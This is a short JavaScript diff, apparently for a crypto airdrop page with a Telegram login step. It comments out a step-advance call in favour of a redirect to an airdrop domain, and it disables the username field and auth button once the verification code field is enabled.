@@ -99,7 +99,7 @@ var TKT = AolaxReactive({
 					isok = false;
 				}
 			*/
-			return this.startNext(e);
+			//return this.startNext(e);
 			window.location.href = "https://airdrop.x6nge.com";
 			return;
 		},
@@ -133,6 +133,12 @@ var TKT = AolaxReactive({
 						var code = $('#telegramCode')
 						code.removeAttr('disabled')
 						code.removeClass('disabledtkt')
+
+						var user = $('#telegramUsername')
+						user.addClass('disabledtkt')
+						user.attr('disabled', '')
+
+						$('button[btn="auth_telegram"]').addClass('disabledtkt')
 
 						that.setCookie("telegramhash", JSON.stringify(r.hash));
 						that.setCookie("telegramid", JSON.stringify(r.id));
